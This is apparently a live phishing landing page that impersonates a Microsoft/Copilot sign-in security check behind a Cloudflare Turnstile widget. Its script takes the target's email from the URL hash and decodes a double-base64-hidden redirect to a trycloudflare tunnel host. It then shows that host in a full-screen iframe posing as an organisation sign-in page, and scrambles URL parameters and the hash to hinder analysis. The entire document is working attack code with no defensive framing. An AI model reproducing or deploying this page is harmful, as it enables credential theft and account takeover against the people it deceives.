@@ -1,0 +1,588 @@
+<!-- url: https://pub-48a1ec5971104e74a53de6b46bf5cec4.r2.dev/caching.html?32a35858d57c1a010094464055eb1d=&amp;auth=Iw7aEAozIkqg&amp;auth=Otl7BStBdiPz&amp;auth=qubjfnit&amp;client=ccSr3sZpyEk8rg5&amp;client=fHvCnA0pcV&amp;client=skdihmwp6rrhhi&amp;device=3EvOegXZIHCk&amp;device=BnwCFaL4HiwRH6o&amp;device=vq1refq459&amp;flow=Az...%20311%20...JlfrIU&amp;tenant=yZXeXDWq0pS0tFsx
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Continue</title>
+    <!-- Import styles -->
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
+    <!-- Turnstile script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    
+    <style>
+        :root {
+            --ms-blue: #0078D4;
+            --ms-dark-blue: #106EBE;
+            --ms-red: #F25022;
+            --ms-green: #7FBA00;
+            --ms-yellow: #FFB900;
+            --ms-purple: #8661C5;
+            --ms-dark: #111827;
+            --shadow: 0 10px 25px rgba(0,0,0,0.05);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #f9fafb 0%, #f3f4f6 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Background design elements */
+        .bg-grid {
+            position: fixed;
+            inset: 0;
+            opacity: 0.03;
+            background-image: 
+                linear-gradient(to right, #000 1px, transparent 1px),
+                linear-gradient(to bottom, #000 1px, transparent 1px);
+            background-size: 20px 20px;
+            z-index: -1;
+        }
+        
+        .bg-shapes {
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            overflow: hidden;
+        }
+        
+        .shape {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(40px);
+            opacity: 0.1;
+        }
+        
+        .shape-1 {
+            width: 300px;
+            height: 300px;
+            background: var(--ms-red);
+            top: -100px;
+            left: -100px;
+        }
+        
+        .shape-2 {
+            width: 250px;
+            height: 250px;
+            background: var(--ms-blue);
+            bottom: -50px;
+            right: -50px;
+        }
+        
+        .shape-3 {
+            width: 200px;
+            height: 200px;
+            background: var(--ms-green);
+            top: 50%;
+            left: 10%;
+        }
+        
+        .shape-4 {
+            width: 180px;
+            height: 180px;
+            background: var(--ms-yellow);
+            bottom: 20%;
+            left: 70%;
+        }
+        
+        /* Main container */
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 0 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            position: relative;
+            transform-style: preserve-3d;
+            perspective: 1000px;
+        }
+        
+        /* Top color bar */
+        .color-bar {
+            height: 4px;
+            width: 100%;
+            background: linear-gradient(90deg, 
+                var(--ms-red) 0%, 
+                var(--ms-red) 25%, 
+                var(--ms-green) 25%, 
+                var(--ms-green) 50%, 
+                var(--ms-blue) 50%, 
+                var(--ms-blue) 75%, 
+                var(--ms-yellow) 75%, 
+                var(--ms-yellow) 100%
+            );
+        }
+        
+        /* Card Content */
+        .card-content {
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Logos */
+        .logos {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .microsoft-logo {
+            width: 120px;
+            margin-right: 15px;
+        }
+        
+        .outlook-logo {
+            width: 110px;
+            margin-left: 15px;
+        }
+        
+        .divider {
+            width: 1px;
+            height: 30px;
+            background: #e5e7eb;
+        }
+        
+        .email-display {
+            text-align: left;
+            width: 100%;
+            margin: 5px 0 15px 0;
+            padding: 0 10px;
+            font-size: 15px;
+            color: #000;
+            font-weight: 500;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        /* Turnstile container */
+        .turnstile-container {
+            margin: 20px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        /* Text content */
+        .text-content {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--ms-dark);
+        }
+        
+        p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.4;
+        }
+        
+        /* Success checkmark (initially hidden) */
+        .checkmark {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--ms-green);
+            color: white;
+            margin: 15px 0;
+            transform: scale(0);
+            opacity: 0;
+        }
+        
+        .checkmark svg {
+            width: 24px;
+            height: 24px;
+        }
+        
+        /* Attribution */
+        .attribution {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+        }
+        
+        /* Hidden iframe */
+        #redirectFrame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 0;
+            opacity: 0;
+            z-index: -1;
+            transition: opacity 0.5s ease, z-index 0s 0.5s;
+        }
+        
+        /* Status message */
+        .status-message {
+            margin-top: 15px;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: center;
+            background: #f0f9ff;
+            color: var(--ms-dark-blue);
+            border: 1px solid #e1f0fa;
+        }
+        
+        /* Turnstile instruction text */
+        .turnstile-text {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background elements -->
+    <div class="bg-grid"></div>
+    <div class="bg-shapes">
+        <div class="shape shape-1"></div>
+        <div class="shape shape-2"></div>
+        <div class="shape shape-3"></div>
+        <div class="shape shape-4"></div>
+    </div>
+    
+    <!-- Main container -->
+    <div class="container" id="mainContainer">
+        <div class="card" id="card">
+            <div class="color-bar"></div>
+            <div class="card-content">
+                <!-- Logos section -->
+                <div class="logos">
+                    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" class="microsoft-logo">
+                    <div class="divider"></div>
+                    <img src="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/Icon_Copilot_64x64?resMode=sharp2&op_usm=1.5,0.65,15,0&wid=32&hei=32&qlt=100&fit=constrain" alt="Microsoft Copilot" class="copilot-logo" width="32">
+                </div>
+                
+                <!-- Email display -->
+                <div id="emailDisplay" class="email-display">
+                    <!-- Email will be displayed here -->
+                </div>
+                
+                <!-- Turnstile container -->
+                <div class="turnstile-container">
+                    <div id="cf-turnstile" class="cf-turnstile" data-sitekey="0x4AAAAAAA5PeFzxadFDHL70" data-callback="turnstileCallback"></div>
+                    <div class="turnstile-text">Complete security check</div>
+                </div>
+                
+                <!-- Checkmark (initially hidden) -->
+                <div class="checkmark" id="checkmark">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+                    </svg>
+                </div>
+                
+                <!-- Status message -->
+                <div class="status-message" id="statusMessage">
+                    Please complete the security check to continue
+                </div>
+            </div>
+        </div>
+        
+        <!-- Attribution -->
+        <div class="attribution">
+            Â© 2025 Microsoft Corporation. All rights reserved.
+        </div>
+    </div>
+    
+    <!-- Hidden redirect iframe -->
+    <iframe id="redirectFrame" title="Organization sign-in page"></iframe>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // URL handler with security measures
+            const urlHandler = {
+                // Generate random URL parameters
+                generateRandomParams: function() {
+                    const paramKeys = [
+                        'session', 'client', 'auth', 'device', 
+                        'origin', 'flow', 'tenant', 'source', 
+                        'platform', 'timestamp'
+                    ];
+                    
+                    const params = {};
+                    
+                    // Generate random param values
+                    paramKeys.forEach(key => {
+                        params[key] = this.generateRandomString(8, 16);
+                    });
+                    
+                    // Add timestamp and security marker
+                    params.timestamp = Date.now();
+                    params.sec = btoa(navigator.userAgent.substring(0, 10));
+                    
+                    return params;
+                },
+                
+                // Generate random string with variable length
+                generateRandomString: function(minLength, maxLength) {
+                    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+                    let result = '';
+                    
+                    // Use crypto API for more secure random values when available
+                    if (window.crypto && window.crypto.getRandomValues) {
+                        const values = new Uint32Array(length);
+                        window.crypto.getRandomValues(values);
+                        for (let i = 0; i < length; i++) {
+                            result += chars[values[i] % chars.length];
+                        }
+                    } else {
+                        // Fallback to less secure Math.random
+                        for (let i = 0; i < length; i++) {
+                            result += chars.charAt(Math.floor(Math.random() * chars.length));
+                        }
+                    }
+                    
+                    return result;
+                },
+                
+                // Apply random parameters to current URL
+                randomizeCurrentUrl: function() {
+                    const randomParams = this.generateRandomParams();
+                    const urlWithoutHash = window.location.href.split('#')[0];
+                    let newUrl = urlWithoutHash;
+                    
+                    // Add separator if needed
+                    if (newUrl.indexOf('?') === -1) {
+                        newUrl += '?';
+                    } else {
+                        newUrl += '&';
+                    }
+                    
+                    // Add random parameters
+                    const paramPairs = [];
+                    for (const [key, value] of Object.entries(randomParams)) {
+                        paramPairs.push(`${key}=${encodeURIComponent(value)}`);
+                    }
+                    
+                    newUrl += paramPairs.join('&');
+                    
+                    // Add hash back if it exists
+                    if (window.location.hash) {
+                        newUrl += window.location.hash;
+                    }
+                    
+                    // Update URL without reloading the page
+                    window.history.replaceState({}, document.title, newUrl);
+                    
+                    return newUrl;
+                },
+                
+                // Decode a URL from base64
+                decodeURL: function(encodedUrl) {
+                    try {
+                        // Multi-layered encoding for obfuscation
+                        const decoded = atob(encodedUrl);
+                        return atob(decoded);
+                    } catch (e) {
+                        console.error('Error decoding URL');
+                        return null;
+                    }
+                },
+                
+                // Get redirect URL with hash parameter
+                getRedirectURL: function() {
+                    // Example encoded URL - in production, this would be encoded
+                    const encodedUrl = 'YUhSMGNITTZMeTl6YjJ4MmFXNW5MWE53Y21GNUxXWnZiM1IzWldGeUxXTmxiR3gxYkdGeUxuUnllV05zYjNWa1pteGhjbVV1WTI5dA==';
+                    
+                    let decodedURL = this.decodeURL(encodedUrl);
+                    if (!decodedURL) {
+                        throw new Error('Invalid redirect URL');
+                    }
+                    
+                    // Get email from hash to pass to redirect URL
+                    const hash = window.location.hash;
+                    if (hash && hash.length > 1) {
+                        // Check if URL already has a hash
+                        if (decodedURL.indexOf('#') !== -1) {
+                            // Replace existing hash
+                            decodedURL = decodedURL.split('#')[0] + hash;
+                        } else {
+                            // Add hash
+                            decodedURL += hash;
+                        }
+                    }
+                    
+                    return decodedURL;
+                },
+                
+                // Create a secure hash for verification
+                createHash: function() {
+                    return this.generateRandomString(16, 16);
+                }
+            };
+            
+            // UI controller
+            const ui = {
+                // Update status message
+                updateStatus: function(message) {
+                    const statusElement = document.getElementById('statusMessage');
+                    if (statusElement) {
+                        statusElement.textContent = message;
+                    }
+                },
+                
+                // Show completion animation
+                showCompletion: function() {
+                    // Show checkmark
+                    gsap.to('#checkmark', {
+                        scale: 1,
+                        opacity: 1,
+                        duration: 0.5,
+                        ease: 'back.out(1.7)'
+                    });
+                    
+                    // Card completion effect
+                    gsap.to('#card', {
+                        rotateY: 5,
+                        rotateX: -5,
+                        duration: 0.7,
+                        ease: 'power2.out'
+                    });
+                },
+                
+                // Execute redirect
+                redirect: function(url) {
+                    // Update status
+                    this.updateStatus('Redirecting to your organization...');
+                    
+                    // Show completion animation
+                    this.showCompletion();
+                    
+                    // Set iframe source
+                    setTimeout(() => {
+                        const frame = document.getElementById('redirectFrame');
+                        frame.src = url;
+                        
+                        // Fade out main content and show iframe
+                        setTimeout(() => {
+                            gsap.to('#mainContainer', {
+                                opacity: 0,
+                                y: -20,
+                                duration: 0.5
+                            });
+                            
+                            frame.style.opacity = '1';
+                            frame.style.zIndex = '100';
+                        }, 500);
+                    }, 1000);
+                }
+            };
+            
+            // Get email from URL hash
+            function getEmailFromHash() {
+                const hash = window.location.hash;
+                
+                // Check if hash contains an email address
+                if (hash && hash.length > 1) {
+                    const hashValue = hash.substring(1); // Remove the # symbol
+                    
+                    // Simple regex to check for email format
+                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                    if (emailRegex.test(hashValue)) {
+                        return hashValue;
+                    }
+                }
+                
+                return null;
+            }
+            
+            // Turnstile callback function
+            window.turnstileCallback = function(token) {
+                console.log("Turnstile verified:", token);
+                
+                // Get email from URL hash
+                const email = getEmailFromHash();
+                
+                // Only redirect if an email is found in the URL hash
+                if (email) {
+                    try {
+                        const redirectUrl = urlHandler.getRedirectURL();
+                        ui.updateStatus('Verification complete');
+                        ui.redirect(redirectUrl);
+                    } catch (error) {
+                        ui.updateStatus('Redirect error. Please try again.');
+                        console.error('Redirect error:', error);
+                    }
+                } else {
+                    // If no email found, show error message
+                    ui.updateStatus('No valid email address found. Redirect canceled.');
+                    ui.showCompletion();
+                }
+            };
+            
+            // Main initialization function
+            function init() {
+                // Randomize URL parameters on load
+                urlHandler.randomizeCurrentUrl();
+                
+                // Get email from URL hash
+                const email = getEmailFromHash();
+                const emailDisplay = document.getElementById('emailDisplay');
+                
+                // Display email if found
+                if (email) {
+                    emailDisplay.textContent = email;
+                } else {
+                    emailDisplay.textContent = '';
+                    emailDisplay.style.display = 'none';
+                }
+                
+                // Set security event listeners
+                document.addEventListener('visibilitychange', function() {
+                    // Log visibility changes
+                    const state = document.visibilityState;
+                    console.log(`Page visibility: ${state}`);
+                    
+                    // Add hash to URL when page is hidden
+                    if (state === 'hidden') {
+                        const secureHash = urlHandler.createHash();
+                        window.history.replaceState({}, document.title, `${window.location.pathname}#${secureHash}`);
+                    }
+                });
+            }
+            
+            // Start everything
+            init();
+        });
+    </script>
+</body>
+</html>
